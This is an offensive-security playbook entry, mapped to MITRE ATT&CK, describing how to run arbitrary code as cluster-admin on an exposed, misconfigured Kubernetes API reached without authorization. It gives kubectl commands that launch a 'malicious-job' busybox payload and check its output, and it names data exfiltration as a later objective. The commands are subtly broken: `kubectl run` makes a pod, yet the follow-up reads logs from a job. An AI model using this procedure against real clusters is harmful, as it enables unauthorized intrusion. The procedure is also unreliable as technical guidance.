---
tags:
  - execution
  - privilege-escalation
  - rce
  - kubernetes
type: procedure
tools:
  - '[[tools/binaryedge.io]]'
tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
commands: []
platforms:
  - Kubernetes
techniques:
  - '[[Command-Line Interface]]'
  - '[[Valid Accounts]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 2f2984cc-d42f-42a4-8faf-c99cc076fb35
created_at: '2025-12-10T05:44:16.331Z'
updated_at: '2025-12-10T05:44:16.331Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
  - '[[TA0004]]'
mitre_techniques:
  - '[[T1059]]'
  - '[[T1078]]'
---
# Execute Arbitrary Code as Cluster-Admin

## Summary

This procedure exploits elevated privileges in an exposed Kubernetes API to run arbitrary code and jobs as cluster-admin, achieving remote code execution.

## Description

With unauthorized access, attackers can create and execute pods or jobs with admin rights. This targets misconfigured Kubernetes clusters, leading to code execution within the cluster environment.

## Requirements

1. Unauthorized access to Kubernetes API
2. kubectl configured for the target
3. Image repository access (e.g., public images like busybox)

## Defense

Defensive measures and detection strategies:

- Implement least-privilege RBAC policies
- Monitor for unauthorized pod/job creations

## Objectives

1. Achieve RCE in the cluster
2. Escalate to admin-level execution
3. Prepare for data exfiltration

## Instructions

### Step 1: Create Malicious Job

**Context**: Run a job to execute arbitrary code.

Use #kubectl-run-job:

```bash
kubectl run malicious-job --image=busybox --command -- sh -c 'whoami && echo exploited'
```

> This creates a job that runs the command.

### Step 2: Verify Execution

**Context**: Check job logs for output.

```bash
kubectl logs job/malicious-job
```

> Confirm code execution by reviewing logs.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Privilege Escalation]]

### Techniques

- [[Command-Line Interface]]
- [[Valid Accounts]]

### Sub-Techniques



## Commands Used

- #kubectl-run-job

## Tools Used

- #kubectl-get-pods

## Tags

- [[Execution]]
- #rce
